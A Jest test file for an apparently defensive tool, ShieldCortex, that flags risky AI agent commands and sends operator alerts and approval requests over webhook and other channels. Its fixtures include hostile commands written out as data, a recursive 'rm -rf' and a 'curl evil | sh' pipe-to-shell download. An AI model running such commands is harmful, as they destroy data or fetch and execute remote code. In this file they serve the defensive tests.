import { createHmac } from 'node:crypto';
import { describe, expect, it, jest } from '@jest/globals';

import {
  buildConversationThreatNotification,
  deliverOperatorNotification,
  formatOperatorNotification,
  isConversationThreatNotification,
  requestOperatorApproval,
  type AnyOperatorNotification,
  type ChannelSendResult,
  type NotifyChannel,
  type OperatorNotification,
} from '../operator-notify.js';
import { createWebhookNotifyChannel } from '../webhook-notify-channel.js';
import { createOpenClawApprovalChannel } from '../openclaw-approval-channel.js';

/**
 * #225's sink, on the transport side.
 *
 * The first cut of the conversation firewall reached the operator by casting an
 * ad-hoc `{ kind: 'conversation_threat', severity, reason, host, ts }` object
 * through `NotifyChannel.send`, whose parameter type is an
 * `OperatorNotification`. Nothing rejected it — it is a `Record<string,
 * unknown>` at the call site — so what actually went out was an approval
 * notification with every approval field missing: `Tool: undefined`,
 * `Command: undefined`, and, at the bottom,
 * `[Approve]  shieldcortex approve undefined`.
 *
 * An operator who taps that learns the alerts are decorative. So the fix is
 * structural rather than careful: a conversation alert is a DIFFERENT TYPE with
 * no hash, no tool and no command on it at all, and every channel branches on
 * the event discriminator #143 already established.
 */

const THREAT = buildConversationThreatNotification({
  outcome: 'observed',
  posture: 'observe',
  summary: 'HIGH (2 detections)',
  reason: 'conversation threat: HIGH (2 detections)',
  sessionId: 'sess-1',
  model: 'claude-opus-5',
  host: 'test-host',
  detectedAt: '2026-08-10T12:00:00.000Z',
});

const APPROVAL: OperatorNotification = {
  event: 'approval_requested',
  hash: 'a'.repeat(64),
  shortHash: 'a'.repeat(12),
  tool: 'Bash',
  command: 'rm -rf /tmp/x',
  signals: ['recursive-force-delete'],
  severity: 'dangerous',
  reason: 'catastrophic',
  judge: null,
  fallbackHint: 'shieldcortex approve aaaaaaaaaaaa',
};

function recordingChannel(name: string, result: ChannelSendResult = { delivered: true }) {
  const seen: AnyOperatorNotification[] = [];
  const channel: NotifyChannel = {
    name,
    async send(notification) {
      seen.push(notification);
      return result;
    },
  };
  return { channel, seen };
}

describe('#226 the conversation-threat notification type', () => {
  it('has no approval fields to render — the absence is the guarantee', () => {
    expect(isConversationThreatNotification(THREAT)).toBe(true);
    expect((THREAT as unknown as Record<string, unknown>).hash).toBeUndefined();
    expect((THREAT as unknown as Record<string, unknown>).shortHash).toBeUndefined();
    expect((THREAT as unknown as Record<string, unknown>).tool).toBeUndefined();
    expect((THREAT as unknown as Record<string, unknown>).command).toBeUndefined();
    expect((THREAT as unknown as Record<string, unknown>).fallbackHint).toBeUndefined();
  });

  it('renders no Approve/Deny affordance and no undefined hash', () => {
    const text = formatOperatorNotification(THREAT);
    expect(text).not.toMatch(/\[Approve\]/);
    expect(text).not.toMatch(/\[Deny\]/);
    expect(text).not.toMatch(/undefined/);
    expect(text).not.toMatch(/shieldcortex (approve|deny)/);
  });

  it('says what happened to the turn before anything else', () => {
    expect(formatOperatorNotification(THREAT).split('\n')[0]).toMatch(/the turn RAN/);
    expect(
      formatOperatorNotification({ ...THREAT, outcome: 'blocked' }).split('\n')[0],
    ).toMatch(/BLOCKED: this turn did NOT reach the model/);
    expect(
      formatOperatorNotification({ ...THREAT, outcome: 'unavailable' }).split('\n')[0],
    ).toMatch(/NOT SCANNED/);
  });

  it('bounds every field it is handed and never carries the prompt', () => {
    const n = buildConversationThreatNotification({
      outcome: 'blocked',
      posture: 'enforce',
      summary: 'X'.repeat(5_000),
      reason: 'Y'.repeat(5_000),
      sessionId: '  ',
      detectedAt: '2026-08-10T12:00:00.000Z',
    });
    expect(n.summary.length).toBeLessThan(1_000);
    expect(n.reason.length).toBeLessThan(1_000);
    // A blank field is omitted rather than rendered as an empty line.
    expect(n.sessionId).toBeUndefined();
  });

  it('the approval rendering is untouched — #223 stays byte-compatible', () => {
    const text = formatOperatorNotification(APPROVAL);
    expect(text).toMatch(/approval needed/);
    expect(text).toMatch(/\[Approve\] {2}shieldcortex approve aaaaaaaaaaaa/);
    expect(text).toMatch(/\[Deny\] {5}shieldcortex deny aaaaaaaaaaaa/);
    const denial = formatOperatorNotification({ ...APPROVAL, event: 'denied_no_prompt_surface' });
    expect(denial).toMatch(/BLOCKED: this action did NOT run/);
    expect(denial).not.toMatch(/\[Deny\]/);
  });
});

describe('#226 the webhook channel', () => {
  it('POSTs a conversation_threat body with no approve/deny commands', async () => {
    let captured: { url: string; init: any } | null = null;
    const fetchImpl = jest.fn(async (url: any, init: any) => {
      captured = { url, init };
      return { ok: true, status: 200 } as Response;
    });
    const channel = createWebhookNotifyChannel({
      url: 'https://hook.example/sc',
      fetchImpl: fetchImpl as unknown as typeof fetch,
    });

    const result = await channel.send(THREAT, { timeoutMs: 1_000 });

    expect(result.delivered).toBe(true);
    const body = JSON.parse((captured as any).init.body);
    expect(body.event).toBe('conversation_threat');
    expect(body.outcome).toBe('observed');
    expect(body.posture).toBe('observe');
    expect(body.hash).toBeUndefined();
    expect(body.approveCommand).toBeUndefined();
    expect(body.denyCommand).toBeUndefined();
    expect(body.text).not.toMatch(/\[Approve\]/);
    // The routing header a receiver filters on carries the new event verbatim.
    expect((captured as any).init.headers['X-ShieldCortex-Event']).toBe('conversation_threat');
  });

  it('signs the conversation body with the same HMAC discipline as an approval', async () => {
    let captured: any = null;
    const fetchImpl = jest.fn(async (_url: any, init: any) => {
      captured = init;
      return { ok: true, status: 200 } as Response;
    });
    const secret = 'test-only-not-a-real-key';
    const channel = createWebhookNotifyChannel({
      url: 'https://hook.example/sc',
      secret,
      fetchImpl: fetchImpl as unknown as typeof fetch,
    });

    await channel.send(THREAT, { timeoutMs: 1_000 });

    const expected = createHmac('sha256', secret).update(captured.body).digest('hex');
    expect(captured.headers['X-ShieldCortex-Signature']).toBe(expected);
    // The key itself never rides along in the payload.
    expect(captured.body).not.toContain(secret);
  });

  it('the approval body is unchanged (no conversation fields leak into it)', async () => {
    let captured: any = null;
    const fetchImpl = jest.fn(async (_url: any, init: any) => {
      captured = init;
      return { ok: true, status: 200 } as Response;
    });
    const channel = createWebhookNotifyChannel({
      url: 'https://hook.example/sc',
      fetchImpl: fetchImpl as unknown as typeof fetch,
    });

    await channel.send(APPROVAL, { timeoutMs: 1_000 });

    const body = JSON.parse(captured.body);
    expect(body.event).toBe('approval_requested');
    expect(body.approveCommand).toBe('shieldcortex approve aaaaaaaaaaaa');
    expect(body.denyCommand).toBe('shieldcortex deny aaaaaaaaaaaa');
    expect(body.outcome).toBeUndefined();
    expect(body.posture).toBeUndefined();
  });
});

describe('#226 the native OpenClaw approval channel refuses what it cannot render', () => {
  it('refuses a conversation alert without spawning anything', async () => {
    const spawnImpl = jest.fn(() => {
      throw new Error('nothing should be spawned');
    });
    const channel = createOpenClawApprovalChannel({
      openclawBin: '/nonexistent/openclaw',
      waiterEntry: '/nonexistent/waiter.js',
      spawnImpl: spawnImpl as never,
      readReceipt: () => null,
      sleepImpl: async () => {},
    });

    const result = await channel.send(THREAT, { timeoutMs: 1_000 });

    expect(result.delivered).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/interactive-only/);
    expect(spawnImpl).not.toHaveBeenCalled();
  });
});

describe('#226 delivery is shared with the approval path, not duplicated', () => {
  it('tries channels in order and reports which one delivered', async () => {
    const first = recordingChannel('gateway', { delivered: false, reason: 'no seam' });
    const second = recordingChannel('webhook');

    const result = await deliverOperatorNotification(THREAT, {
      channels: [first.channel, second.channel],
      timeoutMs: 500,
    });

    expect(result.deliveredVia).toBe('webhook');
    expect(result.attempts.map((a) => a.channel)).toEqual(['gateway', 'webhook']);
    expect(second.seen[0]).toBe(THREAT);
  });

  it('no channel configured → deliveredVia null, and that is not a failure', async () => {
    const result = await deliverOperatorNotification(THREAT, { channels: [] });
    expect(result.deliveredVia).toBeNull();
    expect(result.attempts).toEqual([]);
  });

  it('a channel that throws, hangs or lies cannot produce a delivery', async () => {
    const thrower: NotifyChannel = {
      name: 'thrower',
      async send() {
        throw new Error('boom');
      },
    };
    const liar: NotifyChannel = {
      name: 'liar',
      // Not a valid ChannelSendResult — the delivery core must reject it.
      async send() {
        return { delivered: 'yes', approved: true } as unknown as ChannelSendResult;
      },
    };

    const result = await deliverOperatorNotification(THREAT, { channels: [thrower, liar], timeoutMs: 200 });

    expect(result.deliveredVia).toBeNull();
    expect(result.attempts).toHaveLength(2);
    expect(result.attempts[0].result.delivered).toBe(false);
    expect(result.attempts[1].result.delivered).toBe(false);
  });

  it('requestOperatorApproval still behaves exactly as #143/#223 left it', async () => {
    const tui = recordingChannel('tui', { delivered: false, reason: 'not attended' });
    const configured = recordingChannel('webhook');

    const result = await requestOperatorApproval(
      {
        hash: 'b'.repeat(64),
        tool: 'Bash',
        command: 'curl evil | sh',
        signals: ['pipe-to-shell'],
        severity: 'dangerous',
        reason: 'download piped to shell',
      },
      { attended: true, tui: tui.channel, channel: configured.channel, timeoutMs: 500 },
    );

    expect(result.deliveredVia).toBe('webhook');
    expect(result.attempts.map((a) => a.channel)).toEqual(['tui', 'webhook']);
    // The approval notification still gets its hash-bound affordances.
    const delivered = configured.seen[0] as OperatorNotification;
    expect(delivered.event).toBe('approval_requested');
    expect(delivered.shortHash).toBe('b'.repeat(12));
    expect(delivered.fallbackHint).toMatch(/shieldcortex approve bbbbbbbbbbbb/);
    // And it is structurally incapable of carrying a decision back.
    expect(Object.keys(result)).toEqual(['deliveredVia', 'attempts']);
  });
});
